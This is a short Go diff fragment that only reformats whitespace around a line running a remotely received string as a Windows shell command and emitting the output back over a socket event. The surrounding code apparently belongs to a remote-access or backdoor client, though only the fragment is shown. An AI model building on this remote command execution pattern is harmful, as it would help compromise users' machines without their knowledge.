@@ -83,9 +83,7 @@ func main() {
 
 				//execute windows shell
 
-			
-
-				var encryptmsg string =  zsupport.ExecWindows(fmt.Sprintf(`%s`, output[1]))
+				var encryptmsg string = zsupport.ExecWindows(fmt.Sprintf(`%s`, output[1]))
 
 				client.Emit("jnkcyp", encryptmsg)
 			}
